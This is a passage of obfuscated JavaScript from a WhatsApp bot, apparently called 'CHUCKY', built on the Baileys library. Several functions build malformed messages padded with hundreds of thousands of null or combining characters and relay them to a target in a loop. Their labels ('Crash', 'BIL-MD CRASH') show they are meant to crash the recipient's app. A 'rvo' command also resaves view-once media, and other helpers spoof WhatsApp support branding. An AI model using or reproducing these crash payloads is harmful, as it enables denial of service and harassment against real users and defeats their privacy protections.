      var _0x2fa3e8 = generateWAMessageFromContent(_0x2d2458, proto.Message.fromObject({
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
          fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
          fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
          mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
          mimetype: "image/webp",
          directPath: "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
          fileLength: "10116",
          mediaKeyTimestamp: "1715876003",
          isAnimated: false,
          stickerSentTs: "1715881084144",
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }), {
        userJid: _0x2d2458,
        quoted: _0x3327a3
      });
      await _0x4b53e5.relayMessage(_0x2d2458, _0x2fa3e8.message, {
        participant: {
          jid: _0x2d2458
        },
        messageId: _0x2fa3e8.key.id
      });
    }
    async function _0x20167a(_0x404f6d) {
      const _0x32f067 = generateWAMessageFromContent(_0x404f6d, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                subtitle: "𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
              },
              body: {
                text: "𝖃"
              },
              footer: {
                text: "𝕮𝖗𝖆𝖘𝖍"
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: "{ display_text : '𝖅𝖞𝖓𝖝𝖟𝖔', url : , merchant_url :  }"
                }, {
                  name: "cta_url",
                  buttonParamsJson: "{ display_text : '𝖃', url : , merchant_url :  }"
                }, {
                  name: "cta_url",
                  buttonParamsJson: "{ display_text : '𝕮𝖗𝖆𝖘𝖍', url : , merchant_url :  }"
                }],
                messageParamsJson: "".repeat(999999)
              }
            }
          }
        }
      }), {
        userJid: _0x404f6d
      });
      await _0x4b53e5.relayMessage(_0x404f6d, _0x32f067.message, {
        participant: {
          jid: _0x404f6d
        },
        messageId: _0x32f067.key.id
      });
    }
    async function _0xa9f963(_0x4cb95d) {
      const _0x4ff98b = generateWAMessageFromContent(_0x4cb95d, proto.Message.fromObject({
        listMessage: {
          title: "؂Ù†؃؄Ù½؂Ù†؃؄Ù½" + "\0".repeat(920000),
          footerText: "",
          description: "",
          buttonText: null,
          listType: 2,
          productListInfo: {
            productSections: [{
              title: "Hemm",
              products: [{
                productId: "4392524570816732"
              }]
            }],
            productListHeaderImage: {
              productId: "4392524570816732",
              jpegThumbnail: null
            },
            businessOwnerJid: "0@s.whatsapp.net"
          }
        },
        footer: "ppq",
        contextInfo: {
          expiration: 604800,
          ephemeralSettingTimestamp: "1679959486",
          entryPointConversionSource: "global_search_new_chat",
          entryPointConversionApp: "whatsapp",
          entryPointConversionDelaySeconds: 9,
          disappearingMode: {
            initiator: "INITIATED_BY_ME"
          }
        },
        selectListType: 2,
        product_header_info: {
          product_header_info_id: 292928282928,
          product_header_is_rejected: false
        }
      }), {
        userJid: _0x4cb95d
      });
      await _0x4b53e5.relayMessage(_0x4cb95d, _0x4ff98b.message, {
        participant: {
          jid: _0x4cb95d
        },
        messageId: _0x4ff98b.key.id
      });
    }
    async function _0x425a3c(_0x3b177e, _0x596bcc) {
      var _0x3f4861 = generateWAMessageFromContent(_0x3b177e, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: "p",
              degreesLongitude: "p",
              caption: "ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 ジンクスバグ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕" + "ꦾ".repeat(50000),
              sequenceNumber: "0",
              jpegThumbnail: ""
            }
          }
        }
      }), {
        userJid: _0x3b177e,
        quoted: _0x596bcc
      });
      await _0x4b53e5.relayMessage(_0x3b177e, _0x3f4861.message, {
        participant: {
          jid: _0x3b177e
        },
        messageId: _0x3f4861.key.id
      });
    }
    async function _0x16cddd(_0x29a620, _0x5b3897 = 5) {
      for (let _0x51cedd = 0; _0x51cedd < _0x5b3897; _0x51cedd++) {
        await _0x20638e(_0x29a620);
        await _0x1dbb3f(_0x29a620);
        await _0x5c7d9e;
        _0x28a3bf;
        _0x556ba8;
        await _0x64eff0(_0x29a620);
        await _0x21f01c(_0x29a620);
        await _0x50de4f(_0x29a620);
        await _0x50de4f(_0x29a620);
        await _0x50de4f(_0x29a620);
        await _0x50de4f(_0x29a620);
        await _0x96020a(2300);
      }
    }
    async function _0xf27056(_0x2aa535, _0xfcbdca) {
      var _0x364427 = generateWAMessageFromContent(_0x2aa535, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: "p",
              degreesLongitude: "p",
              caption: "✳️᜴࿆͆᷍《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》\n\n_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ \n\n𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈\n\n*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*\n\n𝗗𝗮𝘀𝗮𝗿 \n𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿\n𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄.\n乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️✅⃟╮.xp" + "ꦾ".repeat(50000),
              sequenceNumber: "0",
              jpegThumbnail: ""
            }
          }
        }
      }), {
        userJid: _0x2aa535,
        quoted: _0xfcbdca
      });
      await _0x4b53e5.relayMessage(_0x2aa535, _0x364427.message, {
        participant: {
          jid: _0x2aa535
        },
        messageId: _0x364427.key.id
      });
    }
    (function (_0x16f57f, _0x51eaf8) {
      var _0x26d125 = _0x12a41b;
      var _0x55ca67 = _0x16f57f();
      while (true) {
        try {
          var _0x37821f = parseInt(_0x26d125(291)) / 1 * (-parseInt(_0x26d125(300)) / 2) + -parseInt(_0x26d125(302)) / 3 + -parseInt(_0x26d125(287)) / 4 + parseInt(_0x26d125(288)) / 5 + parseInt(_0x26d125(286)) / 6 * (-parseInt(_0x26d125(294)) / 7) + -parseInt(_0x26d125(303)) / 8 + -parseInt(_0x26d125(293)) / 9 * (-parseInt(_0x26d125(289)) / 10);
          if (_0x37821f === _0x51eaf8) {
            break;
          } else {
            _0x55ca67.push(_0x55ca67.shift());
          }
        } catch (_0x2c2cd9) {
          _0x55ca67.push(_0x55ca67.shift());
        }
      }
    })(_0x591523, 210576);
    function _0x422dc1() {
      var _0x42f146 = _0x12a41b;
      console.log(_0x42f146(290));
    }
    function _0x591523() {
      var _0x2102c2 = ["10RyLaBj", "Hello World!", "10412BelDfW", "meu ovo", "10276299zlszHl", "42MFbSVh", "physical-goods", "payment_info", "pix_static_code", "pending", "4P46GMY57GC", "38zEAssq", "+5533998586057", "495336GBTdnV", "1900344WdqeoS", "ORDER", "33228OrqiJL", "1342808IxSDsY", "190890kWQtXO"];
      _0x591523 = function () {
        return _0x2102c2;
      };
      return _0x591523();
    }
    _0x422dc1();
    function _0x12a41b(_0x3910fe, _0x2a2af2) {
      var _0x272fc2 = _0x591523();
      _0x12a41b = function (_0x45e866, _0x5bfecd) {
        _0x45e866 = _0x45e866 - 286;
        var _0x588b1e = _0x272fc2[_0x45e866];
        return _0x588b1e;
      };
      return _0x12a41b(_0x3910fe, _0x2a2af2);
    }
    const _0x2337e3 = {
      orderId: "2029",
      thumbnail: _0x34a350,
      itemCount: 1,
      status: "INQUIRY",
      surface: "CATALOG",
      message: "" + (_0x21f0d9.body || _0x21f0d9.mtype),
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    };
    const _0x173691 = {
      orderMessage: _0x2337e3
    };
    const _0x2044b5 = {
      mentionedJid: _0x21f0d9.sender.split,
      forwardingScore: 999,
      isForwarded: true
    };
    const _0x3d57ef = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      },
      message: _0x173691,
      contextInfo: _0x2044b5
    };
    const _0xea19ed = _0x3d57ef;
    async function _0x213f21(_0x4cf2ee, _0x41527c = "desktop") {
      return new Promise((_0xec03f1, _0x42608b) => {
        const _0x2fe6e8 = "https://www.screenshotmachine.com";
        const _0x2f4508 = {
          url: _0x4cf2ee,
          device: _0x41527c,
          cacheLimit: 0
        };
        const _0x15538c = _0x2f4508;
        axios({
          url: _0x2fe6e8 + "/capture.php",
          method: "POST",
          data: new URLSearchParams(Object.entries(_0x15538c)),
          headers: {
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
          }
        }).then(_0x5bb223 => {
          const _0x5c63d8 = _0x5bb223.headers["set-cookie"];
          if (_0x5bb223.data.status == "success") {
            axios.get(_0x2fe6e8 + "/" + _0x5bb223.data.link, {
              headers: {
                cookie: _0x5c63d8.join("")
              },
              responseType: "arraybuffer"
            }).then(({
              data: _0x243348
            }) => {
              const _0x22c0e2 = {
                status: 200,
                result: _0x243348
              };
              result = _0x22c0e2;
              _0xec03f1(result);
            });
          } else {
            const _0x1d89ec = {
              status: 404,
              statuses: "Link Error",
              message: _0x5bb223.data
            };
            _0x42608b(_0x1d89ec);
          }
        }).catch(_0x42608b);
      });
    }
    async function _0x821100(_0x466385) {
      try {
        _0x4b53e5.sendMessage(_0x21f0d9.chat, {
          react: {
            text: "🕒",
            key: _0x21f0d9.key
          }
        });
        if (!isValidYouTubeLink(_0x466385)) {
          throw new Error("The provided link is not a valid YouTube URL.");
        }
        const _0x3eff7b = extractVideoID(_0x466385);
        const _0x10df9f = await fetch("https://api.betabotz.eu.org/api/download/ytmp4?url=https://www.youtube.com/watch?v=" + _0x3eff7b);
        const _0x303445 = await _0x10df9f.json();
        if (!_0x303445 || !_0x303445.status) {
          console.error("API response error:", _0x303445);
          throw new Error("Failed to fetch MP4 data from the API. Please check the video link or try again later.");
        }
        const {
          title: _0x283e88,
          mp4: _0x56392b,
          thumb: _0xb9da31
        } = _0x303445.result || {};
        if (!_0x283e88 || !_0x56392b || !_0xb9da31) {
          console.error("Incomplete API data:", _0x303445.result);
          throw new Error("The API returned incomplete data. Please try another link.");
        }
        const _0x2c53c5 = {
          url: _0x56392b
        };
        const _0x4e984e = {
          video: _0x2c53c5,
          caption: _0x283e88,
          contextInfo: {}
        };
        _0x4e984e.contextInfo.externalAdReply = {};
        _0x4e984e.contextInfo.externalAdReply.title = _0x283e88;
        _0x4e984e.contextInfo.externalAdReply.body = "Powered by Marx's Bot";
        _0x4e984e.contextInfo.externalAdReply.thumbnailUrl = _0xb9da31;
        _0x4e984e.contextInfo.externalAdReply.sourceUrl = _0x56392b;
        await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x4e984e, {
          quoted: _0x21f0d9
        });
        console.log("Success: MP4 sent for video " + _0x283e88);
      } catch (_0x264bf5) {
        _0x3b9923("Error: " + _0x264bf5.message);
      }
    }
    _0x4b53e5.public = true;
    if (!_0x4b53e5.public) {
      if (!_0x39695a) {
        return;
      }
    }
    const _0x5297c5 = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      },
      message: {
        listResponseMessage: {
          title: "𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
        }
      }
    };
    const _0x3b9923 = _0x365671 => {
      const _0x4b4be6 = {
        showAdAttribution: true,
        renderLargerThumbnail: false,
        title: "𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕",
        body: "by 𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌👑",
        previewType: "VIDEO",
        thumbnail: _0x34a350,
        sourceUrl: "" + global.url,
        mediaUrl: "" + global.url
      };
      const _0x349dfe = {
        mentionedJid: [_0x21f0d9.sender],
        externalAdReply: _0x4b4be6
      };
      const _0x3806b4 = {
        text: _0x365671,
        contextInfo: _0x349dfe,
        text: _0x365671
      };
      const _0x1f0d3d = {
        quoted: _0x21f0d9
      };
      _0x4b53e5.sendMessage(_0x22a0dd, _0x3806b4, _0x1f0d3d);
    };
    const _0x4f3b8a = _0x1f9c45 => {
      const _0x2d4c90 = {
        showAdAttribution: false,
        renderLargerThumbnail: false,
        title: "𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕",
        body: "Hey " + _0x45dcac + " 👋",
        previewType: "VIDEO",
        thumbnail: _0x34a350,
        sourceUrl: "" + global.url,
        mediaUrl: "" + global.url
      };
      const _0x49f276 = {
        mentionedJid: [_0x21f0d9.sender],
        externalAdReply: _0x2d4c90
      };
      const _0x242612 = {
        text: _0x1f9c45,
        contextInfo: _0x49f276
      };
      const _0x1bfa22 = {
        remoteJid: "status@broadcast",
        fromMe: false,
        id: _0x21f0d9.key.id
      };
      const _0x69c5bf = {
        text: _0x1f9c45
      };
      const _0xf162e5 = {
        extendedTextMessage: _0x69c5bf
      };
      const _0x63888b = {
        key: _0x1bfa22,
        message: _0xf162e5,
        forwardingScore: 3,
        isForwarded: true
      };
      const _0x2b9df0 = {
        quoted: _0x63888b
      };
      _0x4b53e5.sendMessage(_0x22a0dd, _0x242612, _0x2b9df0);
    };
    const _0xe0d6b3 = {
      orderId: "2029",
      thumbnail: _0x34a350,
      itemCount: "777",
      status: "INQUIRY",
      surface: "CATALOG",
      message: "𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽️",
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    };
    const _0x56a29a = {
      orderMessage: _0xe0d6b3
    };
    const _0x59d6b9 = {
      mentionedJid: [_0x21f0d9.sender],
      forwardingScore: 999,
      isForwarded: true
    };
    const _0x4e2945 = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      },
      message: _0x56a29a,
      contextInfo: _0x59d6b9
    };
    const _0x5db6c4 = _0x4e2945;
    const _0xa45100 = {
      orderId: "2029",
      thumbnail: _0x34a350,
      itemCount: "777",
      status: "INQUIRY",
      surface: "CATALOG",
      message: "BIL-MD CRASH 🔥🐉️",
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    };
    const _0x1a12f4 = {
      orderMessage: _0xa45100
    };
    const _0x55e203 = {
      mentionedJid: [_0x21f0d9.sender],
      forwardingScore: 999,
      isForwarded: true
    };
    const _0x499594 = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      },
      message: _0x1a12f4,
      contextInfo: _0x55e203
    };
    const _0x21b594 = _0x499594;
    const _0x32539a = _0x4b10be => {
      const _0x34ee48 = {
        showAdAttribution: false,
        renderLargerThumbnail: false,
        title: "𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐁𝐀𝐍𝐍𝐄𝐑",
        body: "Wagwan " + _0x45dcac + " 👋",
        previewType: "VIDEO",
        thumbnail: _0x34a350,
        sourceUrl: "mailto:support@whatsapp.com",
        mediaUrl: "mailto:support@whatsapp.com"
      };
      const _0xcd3146 = {
        mentionedJid: [_0x21f0d9.sender],
        externalAdReply: _0x34ee48
      };
      const _0x5ab259 = {
        text: _0x4b10be,
        contextInfo: _0xcd3146,
        text: _0x4b10be
      };
      const _0x1d11fb = {
        quoted: _0x21f0d9
      };
      _0x4b53e5.sendMessage(_0x22a0dd, _0x5ab259, _0x1d11fb);
    };
    const _0xa2e1c2 = _0x2ff186 => {
      const _0x5cd518 = {
        showAdAttribution: false,
        renderLargerThumbnail: false,
        title: "𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐔𝐍𝐁𝐀𝐍𝐍𝐄𝐑",
        body: "Wagwan " + _0x45dcac + " 👋",
        previewType: "VIDEO",
        thumbnail: _0x34a350,
        sourceUrl: "mailto:support@whatsapp.com",
        mediaUrl: "mailto:support@whatsapp.com"
      };
      const _0x4ff425 = {
        mentionedJid: [_0x21f0d9.sender],
        externalAdReply: _0x5cd518
      };
      const _0xb95d0a = {
        text: _0x2ff186,
        contextInfo: _0x4ff425
      };
      const _0x22ee01 = {
        quoted: _0x21f0d9
      };
      _0x4b53e5.sendMessage(_0x22a0dd, _0xb95d0a, _0x22ee01);
    };
    const _0x65b72b = _0x3edb85 => {
      const _0x15f05d = {
        text: _0x3edb85
      };
      const _0x2ed5e6 = {
        quoted: _0x21f0d9
      };
      _0x4b53e5.sendMessage(_0x22a0dd, _0x15f05d, _0x2ed5e6);
    };
    const _0xc9f3c = new Date();
    function _0x3d4d61() {
      let _0x5f1e6b = new Date();
      let _0x17802f = _0x5f1e6b - _0xc9f3c;
      let _0x275c07 = Math.floor(_0x17802f / 86400000);
      let _0x47fa39 = Math.floor(_0x17802f % 86400000 / 3600000);
      let _0x5e3406 = Math.floor(_0x17802f % 3600000 / 60000);
      let _0x364378 = Math.floor(_0x17802f % 60000 / 1000);
      return _0x275c07 + " Days " + _0x47fa39 + " Hours " + _0x5e3406 + " Minutes " + _0x364378 + " Seconds";
    }
    function _0x4edf71() {
      let _0x12f1de = "Bot has been running for: " + _0x3d4d61();
      _0x4b53e5.sendMessage(_0x22a0dd, _0x12f1de);
    }
    function _0xad170d() {
      var _0x38a973 = new Date();
      var _0x1876c5 = _0x38a973.getDate();
      var _0x363544 = _0x38a973.getMonth() + 1;
      var _0x3b400c = _0x38a973.getFullYear();
      var _0x1809e5 = _0x38a973.getHours();
      var _0xee0328 = _0x38a973.getMinutes();
      var _0x169f98 = _0x38a973.getSeconds();
    }
    let _0x267bec = new Date(new Date().getTime() + 3600000);
    let _0x123c32 = "en-GB";
    let _0x409018 = _0x267bec.toLocaleDateString(_0x123c32, {
      weekday: "long"
    });
    let _0x5057c7 = _0x267bec.toLocaleDateString(_0x123c32, {
      day: "numeric",
      month: "long",
      year: "numeric"
    });
    const _0x461a13 = _0x267bec.toLocaleDateString(_0x123c32, {
      day: "numeric",
      month: "long",
      year: "numeric"
    });
    function _0x3b1baa(_0x1e3d9b) {
      var _0x5470b6 = parseInt(_0x1e3d9b % 1000 / 100);
      var _0x3dc91c = Math.floor(_0x1e3d9b / 1000 % 60);
      var _0x1674cd = Math.floor(_0x1e3d9b / 60000 % 60);
      var _0x36f3b7 = Math.floor(_0x1e3d9b / 3600000 % 24);
      _0x36f3b7 = _0x36f3b7 < 10 ? "0" + _0x36f3b7 : _0x36f3b7;
      _0x1674cd = _0x1674cd < 10 ? "0" + _0x1674cd : _0x1674cd;
      _0x3dc91c = _0x3dc91c < 10 ? "0" + _0x3dc91c : _0x3dc91c;
      return _0x36f3b7 + " hours " + _0x1674cd + " minutes " + _0x3dc91c + " seconds";
    }
    function _0x4ddc97(_0x380ed4) {
      let _0x5da717 = _0x380ed4;
      let _0xa7598e = Math.floor(_0x380ed4 / 86400000);
      let _0x4e2038 = _0x380ed4 % 86400000;
      let _0x586eb0 = Math.floor(_0x4e2038 / 3600000);
      let _0x55be71 = _0x380ed4 % 3600000;
      let _0x47ec84 = Math.floor(_0x55be71 / 60000);
      let _0x3bb113 = _0x380ed4 % 60000;
      let _0x483afc = Math.floor(_0x3bb113 / 1000);
      return _0xa7598e + " Days " + _0x586eb0 + " Hours " + _0x47ec84 + " Minutes";
    }
    const _0x461573 = moment().tz("Africa/Lagos").format("HH:mm:ss");
    let _0x214fac;
    if (_0x461573 < "23:59:00") {
      _0x214fac = "Good night 🌃";
    }
    if (_0x461573 < "19:00:00") {
      _0x214fac = "Good evening 🌆";
    }
    if (_0x461573 < "15:00:00") {
      _0x214fac = "Good afternoon 🏙";
    }
    if (_0x461573 < "10:00:00") {
      _0x214fac = "Good morning 🌄";
    }
    if (_0x461573 < "05:00:00") {
      _0x214fac = "Good morning 🌉";
    }
    if (_0x461573 < "03:00:00") {
      _0x214fac = "Midnight 🌌";
    }
    if (_0x3a5987 && _0x4ae68c) {
      let _0x2039cc = _0x5f2303();
      function _0x5f2303() {
        const _0x3cf8bd = require("fs");
        try {
          const _0x292353 = _0x3cf8bd.readFileSync("case.js", "utf8");
          const _0x2fd665 = /case\s+'([^']+)'/g;
          const _0x20f5a0 = _0x292353.match(_0x2fd665);
          if (_0x20f5a0) {
            const _0x1ce87d = _0x20f5a0.map(_0x21ebe9 => _0x21ebe9.replace(/case\s+'([^']+)'/, "$1"));
            return _0x1ce87d;
          } else {
            return [];
          }
        } catch (_0x4f2fcf) {
          console.log("Terjadi kesalahan:", _0x4f2fcf);
          return [];
        }
      }
      let _0x42a998 = _0x4ae68c;
      let _0x52860f = didyoumean(_0x42a998, _0x2039cc);
      let _0x37fc9f = similarity(_0x42a998, _0x52860f);
      let _0x3f7410 = parseInt(_0x37fc9f * 100);
      if (_0x52860f && _0x42a998.toLowerCase() !== _0x52860f.toLowerCase()) {
        let _0x15205b = "Sorry, the command you gave is wrong. maybe this is what you mean:\n\n•> " + (_0x3a5987 + _0x52860f) + "\n•> Similarity: " + _0x3f7410 + "%";
        _0x3b9923(_0x15205b);
      }
    }
    switch (_0x4ae68c) {
      case "devinfo":
        {
          try {
            let _0x1c1752 = await getDevice(_0x21f0d9.quoted ? _0x21f0d9.quoted.id : _0x21f0d9.key.id);
            _0x3b9923("\n ┏━━━━━━━━━━━━━━━━━━━┓\n > C H U C K Y V 6.5\n ┏━━━━━━━━━━━━━━━━━━━┓\n ┃ This is an : " + JSON.stringify(_0x1c1752, null, 2) + " User \n ┗━━━━━━━━━━━━━━━━━━━┛\n ┗━━━━━━━━━━━━━━━━━━━┛\n ┗━━━━━━━━━━━━━━━━━━━┛");
          } catch (_0x5ec0eb) {
            _0x3b9923("Failed to retrieve device information.");
            console.error(_0x5ec0eb);
          }
          break;
        }
      case "rvo":
        {
          const _0x25eba2 = _0x21f0d9.message.extendedTextMessage?.contextInfo?.quotedMessage?.viewOnceMessageV2 ? true : false;
          if (!_0x25eba2) {
            return _0x3b9923("Reply viewonce");
          }
          let _0x42dfef = Object.keys(_0x21f0d9.quoted.message)[0];
          let _0x2e73a2 = _0x21f0d9.quoted.message[_0x42dfef];
          let _0xa22e46 = await downloadContentFromMessage(_0x2e73a2, _0x42dfef == "imageMessage" ? "image" : "video");
          let _0x15dc15 = Buffer.from([]);
          for await (const _0x584f85 of _0xa22e46) {
            _0x15dc15 = Buffer.concat([_0x15dc15, _0x584f85]);
          }
          if (/video/.test(_0x42dfef)) {
            const _0x5e1494 = {
              video: _0x15dc15,
              caption: _0x2e73a2.caption
            };
            await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x5e1494);
          } else if (/image/.test(_0x42dfef)) {
            const _0x2ea32e = {
              image: _0x15dc15,
              caption: _0x2e73a2.caption
            };
            await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x2ea32e);
          }
        }
        break;
      case "bugmevgvfvggnu":
        {
          await _0x34c772();
          const _0x398ba6 = {
            image: _0x34a350
          };
          const _0x4793d2 = {
            upload: _0x4b53e5.waUploadToServer
          };
          let _0x237a8f = await prepareWAMessageMedia(_0x398ba6, _0x4793d2);
          let _0x43de75 = "\n┏━━━━━━━━━━━━━━━━━━━┓\n┃𖥂 *" + _0x214fac + "* *\n┃             `" + _0x45dcac + "`\n┃━━━━━━━━━━━━━━━━━━━\n┃ 𖥂 `𝐓𝐈𝐌𝐄` : *" + _0x461573 + "*\n┃ 𖥂 `𝐃𝐀𝐓𝐄` : *" + _0x461a13 + "*\n┃ 𖥂 `𝐁𝐎𝐓` : " + global.namabot + "\n┃ 𖥂 `𝐕𝐄𝐑𝐒𝐈𝐎𝐍` : " + global.versisc + "\n┃ 𖥂 `𝐎𝐖𝐍𝐄𝐑` : " + global.namaown + "\n┗━━━━━━━━━━━━━━━━━━━┛\n";
          const _0x150e8c = {
            ..._0x237a8f
          };
          _0x150e8c.hasMediaAttachment = false;
          const _0x417115 = {
            text: _0x43de75
          };
          const _0x5b1576 = {
            quoted: _0xea19ed
          };
          const _0x292011 = _0x770315(_0x21f0d9.chat, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  header: _0x150e8c,
                  body: _0x417115,
                  footer: {
                    text: ""
                  },
                  nativeFlowMessage: _0xda26e2.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      name: "single_select",
